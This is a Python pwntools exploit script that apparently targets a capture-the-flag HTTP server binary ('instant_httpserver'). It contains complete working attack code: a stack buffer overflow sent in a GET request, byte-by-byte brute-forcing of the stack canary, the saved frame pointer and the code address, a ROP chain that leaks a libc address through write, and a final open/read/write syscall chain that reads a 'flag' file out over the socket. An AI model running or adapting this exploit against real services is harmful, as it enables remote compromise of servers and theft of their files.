from pwn import *

# context.log_level = 'debug'

if args.R:
    URL = '114.177.250.4'
else:
    URL = '127.0.0.1'
    
PORT = 4445

def http_get(payload): 
    length = len(payload) 
    buf = 'GET '
    # buf = '/ HTTP\r\nContent-Length: '
    # buf += str(length)
    # buf += '*' * 0x100
    # buf += '\r\n\r\n'
    buf += payload
    r.send(buf)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def respond():
    r.recvuntil('\r\n\r\n')
    return r.recv()
    # return r.recvrepeat(1.5)

canary = ''
# canary = '\x00\x93\xf1\x0d\xdc\x9d\x8d\x4c'
# canary = p64(0x7f5651e14c4fb800)
while(1):
    if len(canary) == 8:
        break
    for i in range(0x100): 
        r = remote(URL, PORT)
        payload = 'x'* (0x220 - 0x1c)
        payload += canary
        payload += chr(i)
        http_get(payload)
        res = respond()
        r.close()
        if '<hr><I>instant_httpserver -- ' in res:
            break
            
    canary += chr(i)
    print "CANARY:", canary

print "CANARY:", hex(u64(canary))

rbp = ''
# rbp = p64(0x7ffc32c698f0)

while(1):
    if len(rbp) == 8:
        break
    for i in range(0x100): 
        r = remote(URL, PORT)
        payload = 'x'* (0x220 - 0x1c)
        payload += canary
        payload += rbp
        payload += chr(i)
        http_get(payload)
        res = respond()
        r.close()
        if '<hr><I>instant_httpserver -- ' in res:
            break
            
    rbp += chr(i)
    print "RBP:", rbp

print "RBP:", hex(u64(rbp))
target = u64(rbp) - 0x50

code = '\xca'
# code = p64(0x55729b7a4000+0xdca)
while(1):
    if len(code) == 8:
        break
    for i in range(0x100): 
        r = remote(URL, PORT)
        payload = 'x'* (0x220 - 0x1c)
        payload += canary
        payload += rbp
        payload += code
        payload += chr(i)
        http_get(payload)
        res = respond()
        r.close()
        if '<hr><I>instant_httpserver -- ' in res:
            break
            
    code += chr(i)
    print "CODE:", code

print "CODE:", hex(u64(code))
code_base = u64(code) - 0xdca
dbg("code_base")

bss = code_base + 0x2021c0

rsi_p1 = code_base + 0xe91
rdi = code_base + 0xe93
got_libc = code_base + 0x0201fe0
plt_write = code_base + 0x8c0

context.log_level = 'debug' 
r = remote(URL, PORT)

payload = 'x'* (0x220 - 0x1c)
payload += canary
payload += rbp
payload += p64(rdi)
payload += p64(4)
payload += p64(rsi_p1)
payload += p64(got_libc)
payload += p64(0xdeadbeef)

payload += p64(plt_write)

http_get(payload)
res = respond()
r.close()

libc_leak = u64(res.split('520')[1][:8])
dbg("libc_leak")
libc_base = libc_leak - 0x21ab0
system = libc_base + 0x4f440
binsh = libc_base + 0x1b3e9a

lib_open = libc_base + 0x10fc40
lib_rdx = libc_base + 0x001306b6
lib_syscall = libc_base + 0x000d2975
lib_rax = libc_base + 0x00123764

# pause()
r = remote(URL, PORT)

payload = 'x'* (0x220 - 0x1c)
payload += canary
payload += rbp
payload += p64(rdi)
payload += "flag\x00\x00\x00\x00"
payload += p64(rsi_p1)
payload += p64(0)
payload += p64(0)
payload += p64(rdi)
payload += p64(target)
payload += p64(lib_rax)
payload += p64(2)
payload += p64(lib_syscall)

payload += p64(lib_rdx)
payload += p64(0x100)
payload += p64(rsi_p1)
payload += p64(bss)
payload += p64(0)
payload += p64(rdi)
payload += p64(5) # fd 
payload += p64(lib_rax)
payload += p64(0)
payload += p64(lib_syscall)

payload += p64(rdi)
payload += p64(4) # fd 
payload += p64(lib_rax)
payload += p64(1)
payload += p64(lib_syscall)

http_get(payload)
r.interactive()
